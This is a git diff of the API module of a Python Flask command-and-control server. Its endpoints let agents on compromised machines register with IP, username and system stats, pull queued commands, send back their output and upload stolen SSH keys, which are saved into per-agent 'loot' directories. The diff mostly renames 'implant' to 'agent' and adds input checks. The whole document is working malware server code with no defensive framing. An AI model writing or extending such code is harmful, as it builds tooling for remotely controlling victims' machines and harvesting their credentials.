@@ -1,29 +1,43 @@
+import os
 from datetime import datetime
 
 from flask import Blueprint, abort, request, send_from_directory
 
-from c2 import Agent, Commands
-from c2.app import add_agent, app, db
+from c2 import Agent, Command
+from c2.app import app, db
 
 bp = Blueprint("api", __name__)
 
-@app.route("/api/1.1/add_agent", methods=["POST"])
-def agent_add():
-    """API endpoint that allows an implant to register
+
+@app.route("/api/1.1/register_agent", methods=["POST"])
+def register_agent():
+    """API endpoint that allows an agent to register
     itself to the server
 
     :returns: the new agent ID
     :rtype: str
     """
     if request.method == "POST":
-        agent_dict = request.json
-        id = add_agent(agent_dict)
-        return str(id)
+        agent_info = request.json
+        if agent_info:
+            args = [str(agent_info["Stats"][key]) for key in agent_info["Stats"]]
+            args += [str(agent_info["total"])]
+            args += [agent_info["IP"]]
+            args += [agent_info["USERNAME"]]
+            args += [agent_info["SleepTime"]]
+            new_agent = Agent(*args)
+            db.session.add(new_agent)
+            db.session.flush()
+            agent_id = new_agent.id
+            db.session.commit()
+            os.mkdir(f"loot/agent_{agent_id}")
+            return str(agent_id)
+        return "Bad Request"
 
 
 @app.route("/api/1.1/get_command", methods=["POST"])
 def get_command():
-    """API endpoint that allows an implant to fetch
+    """API endpoint that allows an agent to fetch
     commands from the server
 
     :returns: none if there are no commands to retrieve,
@@ -31,29 +45,30 @@ def get_command():
     :rtype: str
     """
     if request.method == "POST":
-        json = request.json
-        if json is None:
-            return "Bad request"
-        agent_id = int(json["id"])
-        agent = Agent.query.filter(Agent.id == agent_id).first()
-        curr_time = datetime.now()
-        agent.lastSeen = curr_time.strftime("%d %B, %Y %H:%M:%S")
-        res = Commands.query.filter(
-            Commands.implantID == agent_id, Commands.retrieved == False
-        ).first()
-        if res is None:
-            db.session.commit()
+        command_data = request.json
+        if command_data:
+            agent_id = int(command_data["id"])
+            agent = Agent.query.filter(Agent.id == agent_id).first()
+            curr_time = datetime.now()
+            agent.lastSeen = curr_time.strftime("%d %B, %Y %H:%M:%S")
+            res = Command.query.filter(
+                Command.agentID == agent_id, Command.retrieved == False
+            ).first()
+            print(res)
+            if res is None:
+                db.session.commit()
+                db.session.flush()
+                return "None"
+            res.retrieved = True
             db.session.flush()
-            return "None"
-        res.retrieved = True
-        db.session.flush()
-        db.session.commit()
-        return res.command + "," + str(res.commandID)
+            db.session.commit()
+            return res.command + "," + str(res.commandID)
+        return "Bad Request"
 
 
 @app.route("/api/1.1/command_out", methods=["POST"])
 def command_out():
-    """API endpoint that allows an implant to send
+    """API endpoint that allows an agent to send
     output of commands back to the server
 
     :returns: status to the agent of whether it received the output
@@ -62,18 +77,18 @@ def command_out():
     print(request.method)
     if request.method == "POST":
         json = request.json
-        if json is None:
-            return "Bad request"
-        output = json["output"]
-        implantID = json["implantID"]
-        commandID = json["commandID"]
-        command = Commands.query.filter(
-            Commands.implantID == implantID, Commands.commandID == commandID
-        ).first()
-        command.output = output
-        db.session.flush()
-        db.session.commit()
-        return "Received"
+        if json:
+            output = json["output"]
+            agentID = json["agentID"]
+            commandID = json["commandID"]
+            command = Command.query.filter(
+                Command.agentID == agentID, Command.commandID == commandID
+            ).first()
+            command.output = output
+            db.session.flush()
+            db.session.commit()
+            return "Received"
+        return "Bad Request"
 
 
 @app.route("/api/1.1/ssh_keys", methods=["POST"])
@@ -86,14 +101,14 @@ def ssh_keys():
     """
     if request.method == "POST":
         json = request.json
-        if json is None:
-            return "Bad request"
-        key_dict = json["keys"]
-        agent_id = json["id"]
-        with open(f"loot/agent_{agent_id}/ssh_keys.txt", "a+") as file:
-            for key in key_dict:
-                file.write(f"{key}: {key_dict[key]}\n")
-        return "Received BINGUS MODE"
+        if json:
+            key_dict = json["keys"]
+            agent_id = json["id"]
+            with open(f"loot/agent_{agent_id}/ssh_keys.txt", "a+") as file:
+                for key in key_dict:
+                    file.write(f"{key}: {key_dict[key]}\n")
+            return "[*] Received SSH keys"
+        return "Bad Request"
 
 
 @app.route("/api/1.1/retrieve_scripts", methods=["GET"])
